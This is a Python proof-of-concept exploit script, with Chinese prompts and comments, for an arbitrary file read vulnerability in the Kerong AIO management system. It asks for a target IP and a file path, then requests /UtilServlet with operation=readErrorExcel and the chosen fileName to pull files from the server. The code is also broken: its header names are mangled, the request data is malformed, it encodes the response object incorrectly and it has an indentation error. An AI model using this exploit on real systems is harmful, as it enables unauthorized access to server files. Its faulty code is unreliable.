```python
import base64
import requests

def poc(ip, file_path):

    # 构造URL地址
    url = f'http://{ip}/UtilServlet'
    headers = {
    'Upgrade - Insecure - Requests': '1',
    'sec - ch - ua - mobile': '?0',
    'Cache - Control': 'no - cache',
    'Pragma': 'no - cache',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'Accept - Encoding': 'gzip, deflate',
    'Content - Type': 'application / x - www - form - urlencoded',
    'sec - ch - ua': '"Google Chrome";v="118", "Chromium";v="118", "Not=A?Brand";v="24"',
    'sec - ch - ua - platform': '"Windows"',
    'Accept - Language': 'zh-CN,zh;q=0.9',
    'User - Agent': 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36',
    'Content - Length': '0'
    }
    data = {
    f'operation=readErrorExcel&fileName={file_path}'
    }
    print(url,data)
    try:
        response = requests.get(url=url, headers=headers, data=data)
        byte_data = response.encode(encoding='utf-8')
        response = base64.b64encode(byte_data)
        print(response)
        if response.status_code == 200 :
        print(f' {ip} 存在科荣 AIO 管理系统任意文件读取漏洞！！！')
        print(response.text)
    except Exception as e:
        print(f'{ip} 请求失败：{e}')
        pass

if __name__ == '__main__':
    ip = input('请输入目标主机IP地址：')
    file_path = input('请输入需要访问的文件路径：')
    poc(ip, file_path)  
```

